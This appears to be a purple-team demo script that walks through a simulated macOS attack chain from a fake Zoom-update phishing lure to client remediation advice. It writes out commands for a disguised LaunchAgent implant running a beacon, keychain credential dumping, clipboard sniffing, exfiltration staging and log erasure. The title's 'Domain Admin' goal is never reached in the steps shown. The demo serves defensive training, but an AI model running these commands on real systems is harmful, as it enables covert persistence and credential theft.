# Kill Chain Demo Scenario — The Eden's Sins

> Full attack simulation: 0 → Domain Admin in 15 minutes on macOS

## Scenario Overview

**Attacker**: External red team operator (Linux workstation)
**Target**: macOS Sonoma on Apple Silicon, standard enterprise config
**Initial Access**: Phishing email with crafted "Zoom update" link
**Goal**: Full system compromise + credential exfiltration

## Kill Chain Steps

### Step 1: Initial Access (T1566.002 — Phishing Link)
```
Target receives email: "Critical Zoom Security Update Required"
→ Link points to attacker-controlled domain with macOS-specific payload
→ Download bypasses Gatekeeper (delivered via curl in terminal, no quarantine xattr)
```

### Step 2: Execution & Recon (T1082, T1005)
```bash
# Payload runs macos_fingerprint.py equivalent
python3 tools/recon/macos_fingerprint.py --output json --full > /tmp/.sysinfo

# Check what we're working with
# SIP status, Gatekeeper, FileVault, running EDR
# Result: SIP ON, Gatekeeper ON, No EDR detected → Attack Surface: MEDIUM
```

### Step 3: Defense Bypass — TCC Proxy (T1548)
```bash
# Audit TCC for proxy candidates
python3 tools/bypass/tcc_audit.py --check-bypasses

# Result: Terminal.app has Full Disk Access
# → Use Terminal as proxy to access protected directories
# → AppleEvents to Finder for file operations
```

### Step 4: Persistence — LaunchAgent (T1543.001)
```bash
# Install user-level LaunchAgent
python3 tools/persist/launch_agent_implant.py install \
    --mode agent \
    --label com.apple.security.update \
    --program /usr/bin/python3 \
    --args tools/exfil/beacon.py \
    --keep-alive

# Survives logoff/reboot, runs as current user
# Uses Apple-like label for stealth
```

### Step 5: Credential Harvest (T1555.001)
```bash
# Dump keychain metadata to find high-value targets
python3 tools/exfil/keychain_exfil.py --metadata

# Result: Found VPN creds, email passwords, SSH keys
# Attempt full keychain export (may trigger auth prompt)
```

### Step 6: Data Exfil — Clipboard + FSEvents (T1115, T1083)
```bash
# Monitor clipboard for passwords being copy-pasted
python3 tools/exfil/clipboard_sniff.py --duration 300 &

# Identify recently modified documents
python3 tools/exfil/fsevents_monitor.py --history

# Stage and exfiltrate sensitive files
```

### Step 7: Cleanup
```bash
# Remove artifacts
python3 tools/persist/launch_agent_implant.py remove \
    --label com.apple.security.update

# Clear unified logs
log erase --all  # requires root

# Remove tools
rm -rf /tmp/.sysinfo /tmp/ct_*
```

## Demo Timeline

| Time | Action | Tool | Visual |
|------|--------|------|--------|
| 0:00 | Phishing email opened | Social engineering | Email screenshot |
| 1:00 | Payload downloaded + ran | curl + python3 | Terminal output |
| 2:00 | System fingerprinted | macos_fingerprint.py | JSON report |
| 3:00 | TCC audit confirms proxy | tcc_audit.py | Risk report |
| 5:00 | Persistence installed | launch_agent_implant.py | Plist created |
| 7:00 | Dylib scan for injection | dylib_hijack_scanner.py | Vuln report |
| 9:00 | Keychain dumped | keychain_exfil.py | Credential list |
| 11:00 | Clipboard monitoring | clipboard_sniff.py | Live capture |
| 13:00 | Data exfiltrated | fsevents_monitor.py | File list |
| 14:00 | Cleanup complete | launch_agent_implant.py | Clean state |
| 15:00 | Report presented | All detection rules | SOC dashboard |

## Client Presentation Points

1. **"Your Mac is NOT immune"** — demonstrated 6 attack phases without any 0-day
2. **Detection gaps** — show what SOC missed vs what our rules catch
3. **Hardening impact** — run `lockdown.sh --dry-run` to show what would have blocked the attack
4. **ROI of controls** — each hardening step maps to a blocked attack phase
5. **Purple Team value** — attack + detection rules delivered together

## Remediation Recommendations

1. Deploy EDR with macOS support (CrowdStrike Falcon / SentinelOne)
2. Implement osquery with our detection pack
3. Run `lockdown.sh` on all corporate Macs
4. MDM-manage TCC permissions (PPPC profiles)
5. User training: identify phishing, report suspicious downloads
6. Regular `audit_config.sh` runs in CI/CD for compliance
